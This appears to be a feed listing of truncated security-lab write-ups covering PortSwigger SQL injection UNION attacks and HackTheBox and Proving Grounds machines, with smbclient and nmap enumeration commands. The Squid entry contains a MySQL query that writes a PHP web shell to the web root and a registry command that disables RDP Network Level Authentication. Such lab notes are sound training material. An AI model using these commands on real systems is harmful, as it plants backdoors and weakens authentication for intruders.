item.title: SQL Injection UNION Attacks
item.description:
SQL injection UNION attacks

OSCP/WEB/PORTSWIGGER/LearningPath/ServerSide/SQLINJECTION

When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, theÂ ==UNION==Â keyword can be used to retrieve data from other tables within the database. This results in a SQL â€¦

item.title: Dancing Machine
item.description:
Dancing Machine

HTB/STARTING_POINT

In this machine we learn to enumerate SMB file shares.

To list shares

kali@kali:~$ smbclient -L //<serverIP/name> -N

To download all file to a backup file become handing when u have a large file system

kali@kali:~$ smbclient //<serverIP/name>/<shareDisk> -N -Tc backup â€¦
item.dc:creator: MedSecure

item.title: Explosion Machine
item.description:
Explosion

HTB/STARTING_POINT

This machine teach you how to interact with RDP protocol and enumerate it .

Letâ€™s start by map to scan all open ports, since this machine is focused on RDP , we will reduce time by specifying the port on 3389 ;
item.dc:creator: MedSecure

item.title: Redeemer Machine
item.description:
Redeemer

HTB/STARTING_POINT

This machine show you how to interact with a Redis server .

Doing Nmap scan show open port and specifically redid port open on :

kali@kali:~$ nmap -sC -sV -T4 -p- -oA nmap/Redeemer <serverIp>

Result :

# Nmap 7.93 scan initiated Thu Aug 24 02:07:23 2023 â€¦
item.dc:creator: MedSecure

item.title: Squid Machine
item.description:
SQUID - MACHINE / PG

PG/easy_windows

This machine a proxy named squid that proxy all network traffic from outside . It operate on port 3128

Mysql 3306:

SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"

Disable NLA;

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v â€¦
